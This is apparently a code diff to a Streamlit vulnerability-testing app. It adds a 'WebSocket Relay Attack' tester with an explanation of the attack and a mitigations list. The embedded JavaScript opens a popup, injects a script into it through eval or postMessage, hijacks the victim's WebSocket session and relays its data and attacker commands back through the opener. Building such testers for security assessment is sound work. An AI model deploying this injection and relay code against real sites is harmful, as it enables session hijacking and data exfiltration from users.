@@ -56,6 +56,22 @@ with st.sidebar:
     
     st.divider()
     
+    st.subheader("WebSocket Relay Attack")
+    enable_ws_relay = st.toggle(
+        "Enable WebSocket relay via popup",
+        value=False,
+        help="Test if popup can establish WebSocket and relay data back via postMessage"
+    )
+    
+    ws_relay_url = st.text_input(
+        "WebSocket URL for relay",
+        value="ws://localhost:8501/_stcore/stream",
+        placeholder="ws://target.com/ws",
+        help="WebSocket endpoint that popup will connect to"
+    )
+    
+    st.divider()
+    
     with st.expander("🔧 Troubleshooting Guide"):
         st.markdown("""
         **Common Issues:**
@@ -139,12 +155,19 @@ with st.expander("🔍 Validation Tests", expanded=True):
     - ✓ **Bidirectional Communication**: Tests data send/receive capability
     - ✓ **Persistent Connection**: Validates ongoing access vulnerability
     
+    **WebSocket Relay Attack (Advanced):**
+    - ✓ **Popup-Proxied WebSocket**: Tests if popup can establish WS using victim's session
+    - ✓ **Data Relay via postMessage**: Monitors proxied WebSocket data
+    - ✓ **Command Injection**: Tests if attacker can send commands through popup
+    - ✓ **Session Hijacking**: Validates complete session takeover scenario
+    
     **How to Test:**
     1. Set your target URL, popup URL, and WebSocket URL in the sidebar
     2. Configure security settings (opener link, target origin)
     3. For postMessage: Hover over "Open popup" button, then send messages
     4. For WebSocket: Click "Connect WebSocket" to test CSWSH vulnerability
-    5. Click validation buttons to see comprehensive diagnostics
+    5. For Relay Attack: Enable "WebSocket relay via popup" and test combined attack
+    6. Click validation buttons to see comprehensive diagnostics
     """)
 
     st.info("💡 Use the validation buttons in the test interfaces below to run all diagnostic checks.")
@@ -744,3 +767,400 @@ if websocket_url:
     )
 else:
     st.warning("Enter a WebSocket URL in the sidebar to test CSWSH vulnerability.")
+
+st.divider()
+st.subheader("WebSocket Relay Attack (Advanced)")
+st.caption("Test popup-proxied WebSocket hijacking with postMessage relay")
+
+with st.expander("🚨 About WebSocket Relay Attack", expanded=False):
+    st.markdown("""
+    **WebSocket Relay Attack** is more dangerous than direct CSWSH because:
+    
+    **Attack Vector:**
+    1. Attacker opens popup to victim site (keeps opener reference)
+    2. Popup runs on victim's origin → inherits session cookies
+    3. Popup establishes WebSocket connection (uses victim's legitimate session)
+    4. Popup relays ALL WebSocket messages back to attacker via postMessage
+    5. Attacker can inject commands by sending postMessage to popup
+    
+    **Why It Bypasses Protections:**
+    - ✗ **Origin validation bypassed**: Popup is same-origin, so WS connection is legitimate
+    - ✗ **CSRF tokens bypassed**: Popup has access to DOM/storage with tokens
+    - ✗ **Cookie restrictions bypassed**: Popup shares cookie pool with legitimate site
+    - ✗ **Appears as legitimate traffic**: All requests originate from victim's origin
+    
+    **Real-World Impact:**
+    - Complete session hijacking via popup proxy
+    - Persistent access to real-time data streams
+    - Command injection without CORS restrictions
+    - Invisible to most security monitoring
+    
+    **This attack is particularly dangerous for:**
+    - OAuth/OIDC popup-based authentication flows
+    - Real-time collaborative applications
+    - Financial trading platforms
+    - Chat and messaging systems
+    - Live dashboards with WebSocket updates
+    """)
+
+if enable_ws_relay and popup_url.startswith(("http://", "https://")):
+    popup_url_relay_js = json.dumps(popup_url)
+    ws_relay_url_js = json.dumps(ws_relay_url)
+    keep_opener_relay_js = "true"  # Must keep opener for relay to work
+    
+    components.html(
+        f"""
+        <div style="font-family: sans-serif;">
+          <div style="margin-bottom:1rem;padding:0.8rem;background:#ffebee;border-left:4px solid #f44336;">
+            <strong>🚨 Relay Attack Status:</strong>
+            <div style="margin-top:0.5rem;">
+              <span id="relay-popup-status" style="margin-right:1rem;">⚪ Popup: Not opened</span>
+              <span id="relay-ws-status" style="margin-right:1rem;">⚪ WS: Not connected</span>
+              <span id="relay-msg-count" style="margin-right:1rem;">📊 Relayed: 0</span>
+            </div>
+          </div>
+          
+          <div style="display:flex;gap:0.5rem;flex-wrap:wrap;margin-bottom:1rem;">
+            <button id="relay-open" style="padding:0.5rem 0.8rem;cursor:pointer;background:#1976d2;color:white;border:none;border-radius:4px;">Open Relay Popup</button>
+            <button id="relay-init-ws" style="padding:0.5rem 0.8rem;cursor:pointer;background:#388e3c;color:white;border:none;border-radius:4px;">Inject WS Relay Code</button>
+            <button id="relay-send-cmd" style="padding:0.5rem 0.8rem;cursor:pointer;background:#9c27b0;color:white;border:none;border-radius:4px;">Send Command via Popup</button>
+            <button id="relay-validate" style="padding:0.5rem 0.8rem;cursor:pointer;background:#f57c00;color:white;border:none;border-radius:4px;">Run Relay Tests</button>
+            <button id="relay-clear" style="padding:0.5rem 0.8rem;cursor:pointer;background:#757575;color:white;border:none;border-radius:4px;">Clear Log</button>
+          </div>
+          
+          <div id="relay-info" style="margin-bottom:0.6rem;padding:0.5rem;background:#e3f2fd;border:1px solid #2196f3;border-radius:4px;color:#0d47a1;">Ready to test WebSocket relay attack</div>
+          <pre id="relay-log" style="padding:0.6rem;background:#f7f7f7;border:1px solid #ddd;border-radius:4px;max-height:400px;overflow:auto;font-size:0.85rem;"></pre>
+        </div>
+
+        <script>
+          const relayInfo = document.getElementById("relay-info");
+          const relayLog = document.getElementById("relay-log");
+          const relayOpenBtn = document.getElementById("relay-open");
+          const relayInitWsBtn = document.getElementById("relay-init-ws");
+          const relaySendCmdBtn = document.getElementById("relay-send-cmd");
+          const relayValidateBtn = document.getElementById("relay-validate");
+          const relayClearBtn = document.getElementById("relay-clear");
+          const relayPopupStatusEl = document.getElementById("relay-popup-status");
+          const relayWsStatusEl = document.getElementById("relay-ws-status");
+          const relayMsgCountEl = document.getElementById("relay-msg-count");
+
+          const popupUrl = {popup_url_relay_js};
+          const wsRelayUrl = {ws_relay_url_js};
+
+          let relayPopup = null;
+          let relayedMessageCount = 0;
+          let wsConnectedInPopup = false;
+
+          function relayAppend(line, type = "info") {{
+            const timestamp = new Date().toLocaleTimeString();
+            const prefix = type === "success" ? "✓" : type === "error" ? "✗" : type === "warning" ? "⚠" : type === "vuln" ? "🔴" : type === "attack" ? "💀" : "ℹ";
+            relayLog.textContent += `[${{timestamp}}] ${{prefix}} ${{line}}\\n`;
+            relayLog.scrollTop = relayLog.scrollHeight;
+          }}
+
+          function relayUpdateInfo(msg, type = "info") {{
+            relayInfo.textContent = msg;
+            relayInfo.style.background = type === "success" ? "#d4edda" : type === "error" ? "#f8d7da" : type === "warning" ? "#fff3cd" : type === "vuln" ? "#ffebee" : type === "attack" ? "#fce4ec" : "#e3f2fd";
+            relayInfo.style.borderColor = type === "success" ? "#c3e6cb" : type === "error" ? "#f5c6cb" : type === "warning" ? "#ffc107" : type === "vuln" ? "#f44336" : type === "attack" ? "#e91e63" : "#2196f3";
+            relayInfo.style.color = type === "success" ? "#155724" : type === "error" ? "#721c24" : type === "warning" ? "#856404" : type === "vuln" ? "#b71c1c" : type === "attack" ? "#880e4f" : "#0d47a1";
+          }}
+
+          function updateRelayPopupStatus() {{
+            if (relayPopup && !relayPopup.closed) {{
+              relayPopupStatusEl.textContent = "🟢 Popup: Open";
+              relayPopupStatusEl.style.color = "#2e7d32";
+            }} else {{
+              relayPopupStatusEl.textContent = "🔴 Popup: Closed";
+              relayPopupStatusEl.style.color = "#c62828";
+            }}
+          }}
+
+          function updateRelayWsStatus(connected) {{
+            wsConnectedInPopup = connected;
+            if (connected) {{
+              relayWsStatusEl.textContent = "🟢 WS: Connected";
+              relayWsStatusEl.style.color = "#2e7d32";
+            }} else {{
+              relayWsStatusEl.textContent = "🔴 WS: Disconnected";
+              relayWsStatusEl.style.color = "#c62828";
+            }}
+          }}
+
+          function updateRelayMsgCount() {{
+            relayMsgCountEl.textContent = `📊 Relayed: ${{relayedMessageCount}}`;
+            if (relayedMessageCount > 0) {{
+              relayMsgCountEl.style.color = "#d32f2f";
+            }}
+          }}
+
+          // Listen for messages from popup (relay channel)
+          window.addEventListener("message", (event) => {{
+            if (event.data && event.data.type === "ws_relay_data") {{
+              relayedMessageCount++;
+              updateRelayMsgCount();
+              relayAppend("💀 RELAYED DATA FROM POPUP:", "attack");
+              const dataPreview = JSON.stringify(event.data.wsData).substring(0, 150);
+              relayAppend(`   Data: ${{dataPreview}}${{dataPreview.length >= 150 ? "..." : ""}}`, "vuln");
+              relayAppend("   🔴 Successfully hijacked WebSocket session!", "vuln");
+            }} else if (event.data && event.data.type === "ws_relay_status") {{
+              if (event.data.status === "connected") {{
+                updateRelayWsStatus(true);
+                relayAppend("🔴 Popup established WebSocket connection!", "vuln");
+                relayAppend("   Using victim's session cookies", "vuln");
+                relayUpdateInfo("⚠️ RELAY ATTACK ACTIVE - Session Hijacked!", "attack");
+              }} else if (event.data.status === "disconnected") {{
+                updateRelayWsStatus(false);
+                relayAppend("WebSocket in popup disconnected", "warning");
+              }} else if (event.data.status === "error") {{
+                relayAppend(`Popup WS error: ${{event.data.message}}`, "error");
+              }}
+            }} else if (event.data && event.data.type === "relay_ready") {{
+              relayAppend("✓ Popup relay code injected successfully", "success");
+              relayAppend("   Popup is ready to establish WebSocket", "info");
+            }}
+          }});
+
+          relayOpenBtn.addEventListener("click", () => {{
+            if (relayPopup && !relayPopup.closed) {{
+              relayAppend("Popup already open", "warning");
+              return;
+            }}
+
+            relayAppend("\\n=== Opening Relay Popup ===");
+            relayAppend(`Target: ${{popupUrl}}`);
+            relayAppend("Opener reference: ENABLED (required for relay)");
+            relayAppend("⚠ This allows popup to communicate with attacker", "warning");
+
+            try {{
+              // Must keep opener for relay to work
+              relayPopup = window.open(popupUrl, "_blank", "");
+              
+              if (relayPopup) {{
+                relayAppend("✓ Popup opened successfully", "success");
+                updateRelayPopupStatus();
+                relayAppend("💀 Attacker now has cross-window access", "attack");
+              }} else {{
+                relayAppend("✗ Popup blocked by browser", "error");
+              }}
+            }} catch (e) {{
+              relayAppend(`Error: ${{e.message}}`, "error");
+            }}
+
+            setInterval(updateRelayPopupStatus, 1000);
+          }});
+
+          relayInitWsBtn.addEventListener("click", () => {{
+            if (!relayPopup || relayPopup.closed) {{
+              relayAppend("No popup open. Click 'Open Relay Popup' first.", "error");
+              return;
+            }}
+
+            relayAppend("\\n=== Injecting WebSocket Relay Code ===");
+            relayAppend("Attempting to inject malicious relay script...");
+            
+            try {{
+              // This simulates what an attacker would do - inject code to establish WS and relay data
+              const injectionCode = `
+                (function() {{
+                  if (window.relayWsActive) return;
+                  window.relayWsActive = true;
+                  
+                  console.log("[RELAY] Initializing WebSocket relay...");
+                  window.opener.postMessage({{ type: 'relay_ready' }}, '*');
+                  
+                  const ws = new WebSocket('${{wsRelayUrl}}');
+                  
+                  ws.onopen = () => {{
+                    console.log("[RELAY] WebSocket connected - relaying to attacker");
+                    window.opener.postMessage({{ 
+                      type: 'ws_relay_status', 
+                      status: 'connected' 
+                    }}, '*');
+                  }};
+                  
+                  ws.onmessage = (event) => {{
+                    console.log("[RELAY] Intercepted message, relaying to attacker");
+                    window.opener.postMessage({{ 
+                      type: 'ws_relay_data',
+                      wsData: event.data,
+                      timestamp: Date.now()
+                    }}, '*');
+                  }};
+                  
+                  ws.onerror = (error) => {{
+                    console.log("[RELAY] WebSocket error");
+                    window.opener.postMessage({{ 
+                      type: 'ws_relay_status', 
+                      status: 'error',
+                      message: 'Connection failed'
+                    }}, '*');
+                  }};
+                  
+                  ws.onclose = () => {{
+                    console.log("[RELAY] WebSocket closed");
+                    window.opener.postMessage({{ 
+                      type: 'ws_relay_status', 
+                      status: 'disconnected' 
+                    }}, '*');
+                  }};
+                  
+                  // Listen for commands from attacker
+                  window.addEventListener('message', (event) => {{
+                    if (event.data.type === 'ws_relay_command') {{
+                      console.log("[RELAY] Received command from attacker, sending via WS");
+                      ws.send(JSON.stringify(event.data.payload));
+                    }}
+                  }});
+                  
+                  window.relayWs = ws;
+                }})();
+              `;
+              
+              // Attempt to execute in popup context
+              try {{
+                relayPopup.eval(injectionCode);
+                relayAppend("✓ Relay code injected via eval()", "success");
+              }} catch (evalError) {{
+                // eval might be blocked, try postMessage approach
+                relayAppend("⚠ Direct eval blocked, using postMessage injection", "warning");
+                relayPopup.postMessage({{ 
+                  type: 'execute_script', 
+                  code: injectionCode 
+                }}, '*');
+              }}
+              
+              relayAppend("💀 Popup will establish WebSocket with victim's cookies", "attack");
+              relayAppend("   All WS data will be relayed back here", "vuln");
+              
+            }} catch (e) {{
+              relayAppend(`Injection error: ${{e.message}}`, "error");
+              relayAppend("⚠ Cross-origin restrictions may block injection", "warning");
+              relayAppend("   This would work if popup is same-origin", "info");
+            }}
+          }});
+
+          relaySendCmdBtn.addEventListener("click", () => {{
+            if (!relayPopup || relayPopup.closed) {{
+              relayAppend("No popup open", "error");
+              return;
+            }}
+
+            if (!wsConnectedInPopup) {{
+              relayAppend("WebSocket not connected in popup yet", "warning");
+              return;
+            }}
+
+            const testCommand = {{ type: "test", action: "malicious_command", timestamp: Date.now() }};
+            
+            relayAppend("\\n=== Sending Command via Popup Proxy ===");
+            relayAppend(`Command: ${{JSON.stringify(testCommand)}}`);
+            
+            try {{
+              relayPopup.postMessage({{ 
+                type: 'ws_relay_command',
+                payload: testCommand
+              }}, '*');
+              
+              relayAppend("✓ Command sent to popup for relay", "success");
+              relayAppend("💀 Popup will forward to WebSocket", "attack");
+              relayAppend("   Bypasses CORS - appears as legitimate traffic", "vuln");
+              
+            }} catch (e) {{
+              relayAppend(`Error: ${{e.message}}`, "error");
+            }}
+          }});
+
+          relayValidateBtn.addEventListener("click", () => {{
+            relayAppend("\\n=== Running WebSocket Relay Attack Validation ===");
+
+            // Test 1: Popup access
+            relayAppend("Test 1: Popup Access & Opener Reference");
+            if (relayPopup && !relayPopup.closed) {{
+              relayAppend("  ✓ Popup window is open", "success");
+              try {{
+                if (relayPopup.opener === window) {{
+                  relayAppend("  🔴 VULNERABLE: Opener reference maintained", "vuln");
+                  relayAppend("  This allows bidirectional communication", "vuln");
+                }} else {{
+                  relayAppend("  ✓ Opener reference broken", "success");
+                }}
+              }} catch (e) {{
+                relayAppend("  ⚠ Cannot verify opener (may be cross-origin)", "warning");
+              }}
+            }} else {{
+              relayAppend("  ✗ No popup open", "error");
+            }}
+
+            // Test 2: WebSocket relay
+            relayAppend("\\nTest 2: WebSocket Relay Status");
+            if (wsConnectedInPopup) {{
+              relayAppend("  🔴 VULNERABLE: Popup has active WebSocket", "vuln");
+              relayAppend("  Popup is using victim's session cookies", "vuln");
+            }} else {{
+              relayAppend("  ℹ WebSocket not connected in popup", "info");
+            }}
+
+            // Test 3: Data exfiltration
+            relayAppend("\\nTest 3: Data Relay Channel");
+            relayAppend(`  Messages relayed: ${{relayedMessageCount}}`);
+            if (relayedMessageCount > 0) {{
+              relayAppend("  🔴 VULNERABLE: Successfully exfiltrating data!", "vuln");
+              relayAppend("  Attacker is receiving real-time WebSocket data", "vuln");
+            }} else {{
+              relayAppend("  ℹ No data relayed yet", "info");
+            }}
+
+            // Test 4: Command injection
+            relayAppend("\\nTest 4: Command Injection Capability");
+            if (relayPopup && !relayPopup.closed && wsConnectedInPopup) {{
+              relayAppend("  🔴 VULNERABLE: Can inject commands via popup", "vuln");
+              relayAppend("  Commands appear as legitimate traffic", "vuln");
+              relayAppend("  Bypasses CORS and CSRF protections", "vuln");
+            }}
+
+            // Summary
+            relayAppend("\\n=== Attack Assessment ===");
+            if (relayPopup && !relayPopup.closed && wsConnectedInPopup) {{
+              relayAppend("💀 CRITICAL: WebSocket Relay Attack Successful!", "attack");
+              relayAppend("Complete session hijacking via popup proxy", "vuln");
+              relayAppend("\\nMitigation Required:");
+              relayAppend("  • Use 'noopener,noreferrer' for ALL window.open()");
+              relayAppend("  • Validate WebSocket origin header");
+              relayAppend("  • Implement CSRF tokens for WebSocket");
+              relayAppend("  • Use SameSite=Strict cookies");
+              relayAppend("  • Monitor for suspicious cross-window communication");
+            }} else if (relayPopup && !relayPopup.closed) {{
+              relayAppend("⚠ Popup open but WebSocket not relayed", "warning");
+              relayAppend("   Attack partially successful", "warning");
+            }} else {{
+              relayAppend("ℹ Attack not executed or blocked", "info");
+            }}
+            
+            relayAppend("=== Validation Complete ===\\n");
+          }});
+
+          relayClearBtn.addEventListener("click", () => {{
+            relayLog.textContent = "";
+            relayUpdateInfo("Log cleared", "info");
+          }});
+
+          // Initial message
+          setTimeout(() => {{
+            relayAppend("WebSocket Relay Attack tester initialized");
+            relayAppend("⚠ This demonstrates a sophisticated attack vector");
+            relayAppend("Steps:");
+            relayAppend("  1. Click 'Open Relay Popup' to open victim site");
+            relayAppend("  2. Click 'Inject WS Relay Code' to establish proxy");
+            relayAppend("  3. Watch for relayed messages in this log");
+            relayAppend("  4. Test command injection via 'Send Command'");
+            relayAppend("\\nNote: Cross-origin restrictions may prevent injection");
+            relayAppend("Real attack would work if popup is same-origin\\n");
+          }}, 500);
+        </script>
+        """,
+        height=650,
+    )
+elif enable_ws_relay:
+    st.warning("Enter a valid popup URL (http:// or https://) to test WebSocket relay attack.")
+else:
+    st.info("💡 Enable 'WebSocket relay via popup' in the sidebar to test this advanced attack vector.")
